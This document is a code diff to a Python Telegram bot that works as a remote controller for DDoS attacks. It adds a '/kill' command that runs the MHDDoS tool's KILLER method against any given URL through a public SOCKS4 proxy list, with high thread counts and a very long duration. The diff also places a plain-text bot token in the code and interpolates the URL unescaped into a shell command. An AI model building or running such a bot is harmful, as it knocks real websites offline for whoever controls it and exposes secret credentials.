@@ -5,7 +5,7 @@ import subprocess
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # Telegram Bot Token
-TOKEN = "7684261013:AAGDDOGFZ8Uz2Vlp8CCF_UWr9uLyi5X1ejc"
+TOKEN = "7684261013:AAEoDPXTmwA-EuSg-ClIOpR-KVlt96J_Hg0"
 bot = telebot.TeleBot(TOKEN)
 
 # Allowed Admins to use specific commands
@@ -142,6 +142,34 @@ def stop_attack(call):
     except Exception as e:
         bot.answer_callback_query(call.id, f"AN ERROR OCCURRED: {str(e)}")
         bot.send_message(call.message.chat.id, f"AN ERROR OCCURRED: {str(e)}")
+
+@bot.message_handler(commands=['kill'])
+def handle_kill_command(message):
+    try:
+        user_id = message.from_user.id
+        if user_id not in ALLOWED_USERS:
+            bot.reply_to(message, "🚫 YOU DO NOT HAVE PERMISSION TO USE THIS COMMAND!")
+            return
+
+        command_parts = message.text.split()
+        if len(command_parts) != 2:
+            bot.reply_to(message, "⚠️ CORRECT USAGE: /KILL <TARGET_URL>")
+            return
+
+        target_url = command_parts[1]
+
+        # Ensure the URL is valid (basic validation for the format)
+        if not target_url.startswith("https://"):
+            bot.reply_to(message, "⚠️ INVALID URL. MUST START WITH 'https://'")
+            return
+
+        # Prepare and execute the command
+        kill_command = f"python3 /workspaces/MHDDoS/start.py KILLER {target_url} 4 100 https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt 1000 99999 --debug"
+        process = subprocess.Popen(kill_command, shell=True, preexec_fn=os.setsid)
+
+        bot.reply_to(message, f"✅ KILL COMMAND EXECUTED SUCCESSFULLY ON {target_url}")
+    except Exception as e:
+        bot.reply_to(message, f"AN ERROR OCCURRED: {str(e)}")
 
 print("BOT IS RUNNING...")
 bot.polling()
